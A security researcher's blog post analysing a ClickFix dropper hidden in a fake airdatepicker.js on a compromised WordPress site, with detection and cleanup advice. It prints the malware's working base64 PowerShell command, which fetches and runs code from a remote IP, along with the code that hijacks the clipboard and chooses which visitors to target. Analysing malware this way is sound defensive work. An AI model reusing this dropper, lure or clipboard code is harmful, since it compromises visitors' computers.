---
title: "Suspicious IP Address" - A ClickFix PowerShell Dropper Hidden in airdatepicker.js
url: https://lukeleal.com/research/posts/clickfix-suspicious-ip-powershell-dropper/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:25.891595
---

# "Suspicious IP Address" - A ClickFix PowerShell Dropper Hidden in airdatepicker.js

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [“Suspicious IP Address” - A ClickFix PowerShell Dropper Hidden in airdatepicker.js](https://lukeleal.com/research/posts/clickfix-suspicious-ip-powershell-dropper/)

2025-07-09Luke

#[ClickFix](https://lukeleal.com/research/tags/clickfix/)
#[powershell](https://lukeleal.com/research/tags/powershell/)
#[dropper](https://lukeleal.com/research/tags/dropper/)
#[airdatepicker.js](https://lukeleal.com/research/tags/airdatepicker.js/)
#[WordPress](https://lukeleal.com/research/tags/wordpress/)
#[JavaScript](https://lukeleal.com/research/tags/javascript/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
!["Suspicious IP Address" - A ClickFix PowerShell Dropper Hidden in airdatepicker.js](https://lukeleal.com/research/clickfix-suspicious-ip-cover-q90.jpg "Cover Image")

## Table of Contents

* [Deobfuscation](#deobfuscation)
* [Who Gets Targeted](#who-gets-targeted)
* [The Lure](#the-lure)
* [Clipboard Hijacking on mousemove](#clipboard-hijacking-on-mousemove)
* [Sloppy Leftovers](#sloppy-leftovers)
* [Detection & Cleanup](#detection--cleanup)
* [IOCs](#iocs)
* [Sample](#sample)

Website malware that uses *the visitor* as the exploit has become very popular. This sample was found as a file named `airdatepicker.js` (a real jQuery date picker library) on an infected WordPress site. Nothing in it is a date picker. The whole 50 KB file is obfuscated with the usual `_0x` string-array obfuscation.

Its job is to replace the website with a fake security check that walks the visitor through **running a PowerShell command on their own computer**. This technique is commonly referred to as **ClickFix**.

## Deobfuscation[#](#deobfuscation)

The file uses the standard obfuscator[.]io layout: a string array, a rotation IIFE that shuffles it, and a decoder function `_0xe52e()`. After resolving the strings, the configuration block at the top of the script becomes readable:

```
const STRING_TO_COPY = "cmd /c powershell -W Hidden -e aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwA5ADEALgAyADAANgAuADEANwA4AC4AMQAyADAAOgA1ADAAMAAxAC8AZwBlAHQAXwB0AHgAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAQQBSAFMASQBOAEcAKQAuAEMAbwBuAHQAZQBuAHQA",
      storageLocked = '6JcfUyj4qL78ztj9un4es2UcgtvPakqs',
      CHANCE = 0xf,
      NEW_SITE_HTML = "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiIgY2xhc3M9ImgtMTAw...";
```

The `-e` argument is base64 encoded **UTF-16LE**, which is how PowerShell expects encoded commands:

```
iex (iwr hxxp://91[.]206[.]178[.]120:5001/get_txt -UseBasicPARSING).Content
```

`iwr` (`Invoke-WebRequest`) downloads the response from `91[.]206[.]178[.]120:5001/get_txt`, and `iex` (`Invoke-Expression`) runs it. The `-W Hidden` flag means no PowerShell window is ever shown.

## Who Gets Targeted[#](#who-gets-targeted)

The main function decides who sees the fake page:

```
function isAdmin() {
    return document.cookie.includes("wordpress_logged_in");
}

function main() {
    if (isAdmin()) return console.log('JQuery loaded');
    if (getWithExpiry(storageLocked)) return changeView();
    const _0x3ea3d6 = Math.floor(Math.random() * 0x64);
    console.log(_0x3ea3d6);
    if (_0x3ea3d6 < CHANCE) return setWithExpiry(storageLocked, !![], 0x14 * 0x3c * 0x3e8), changeView();
}
main();
```

* **Logged-in WordPress users are skipped.** If the `wordpress_logged_in` cookie exists, the script only logs `JQuery loaded` to the console. The site owner checking their own site never sees anything wrong.
* **Only 15% of visitors** (`CHANCE = 0xf`) are shown the lure. Random sampling makes the problem hard to reproduce. Customers complain, and the owner loads the site and everything looks fine.
* Once a visitor is chosen, a `localStorage` key `6JcfUyj4qL78ztj9un4es2UcgtvPakqs` locks them in for **20 minutes** (`0x14 * 0x3c * 0x3e8` ms). Refreshing the page won’t make the lure go away.

## The Lure[#](#the-lure)

`changeView()` decodes `NEW_SITE_HTML` and replaces **the entire page** with it:

```
function changeView() {
    const _0xa0a3f2 = atob(NEW_SITE_HTML);
    document.querySelector('html').innerHTML = _0xa0a3f2;
    ...
```

The new page is titled **“Suspicious IP Address”** and gives these instructions:

```
Final Step of Access Update
Ensuring a Secure and Verified Connection

To maintain a stable and secure connection, our system requires a quick
verification step. This is a standard procedure and takes only a few seconds.

  This will open the Run window   Win + R
  This will copy                  Ctrl + V
  This finish                     Enter

In some cases, Windows Defender or your antivirus software may display a
notification. This is expected behavior for new security processes and does
not indicate any issue.
```

The message preemptively explains away any antivirus warning the victim might get. After the visitor clicks **Continue**, a “Verification in Progress” modal shows a **20:00** countdown and says to refresh if access isn’t restored, which keeps the victim waiting while the payload runs.

There’s even a link to Microsoft’s real “Windows Commands” documentation at the bottom for added legitimacy.

## Clipboard Hijacking on mousemove[#](#clipboard-hijacking-on-mousemove)

The page never asks the visitor to copy anything. The script does it *for* them on every mouse movement:

```
document.addEventListener("mousemove", function() {
    if (!code) return;
    copyToClipboard(code + (" & REM " + Math.floor(Math.random() * 0x9)));
});
```

`copyToClipboard()` uses `window.clipboardData` if available, and otherwise falls back to a hidden `<textarea>` with `document.execCommand("copy")`. By the time the visitor presses **Win + R** and **Ctrl + V**, the PowerShell command is already on their clipboard.

The added `& REM <random digit>` is a `cmd` comment. It doesn’t change what runs, but it makes each copied string slightly different, which helps beat exact-match detections of the clipboard content.

## Sloppy Leftovers[#](#sloppy-leftovers)

The deobfuscated code has a few mistakes worth noting:

* `fetchCode()` calls `fetch(CODE_URL)`, but `CODE_URL` is never defined. It looks like an earlier version pulled the command from a remote URL before it was hardcoded.
* The countdown timer has a stray Cyrillic character in it when it reaches zero:

```
if (_0x1692e4 <= 0x0) { clearInterval(_0x2a409d), _0x25d085.textContent = '00:00', _0x4a86db(), я; return; }
```

`я` is undefined, so the timer throws a `ReferenceError` when the countdown ends. That likely points to a Russian-language keyboard layout during development.

## Detection & Cleanup[#](#detection--cleanup)

* Search JavaScript files for `powershell -W Hidden -e`, `wordpress_logged_in` combined with `Math.random`, and very large base64 strings starting with `PCFET0NUWVBFIGh0bWw` (`<!DOCTYPE html`).
* Compare “library” files such as `airdatepicker.js` against the original from the plugin or theme. A minified library that’s *all* `_0x` obfuscation isn’t the real thing.
* **Testing while logged out is required.** Use a private window, and expect to reload many times or clear `localStorage` because of the 15% chance.
* Anyone who followed the instructions on the fake page should treat their Windows machine as compromised.

## IOCs[#](#iocs)

```
hxxp://9...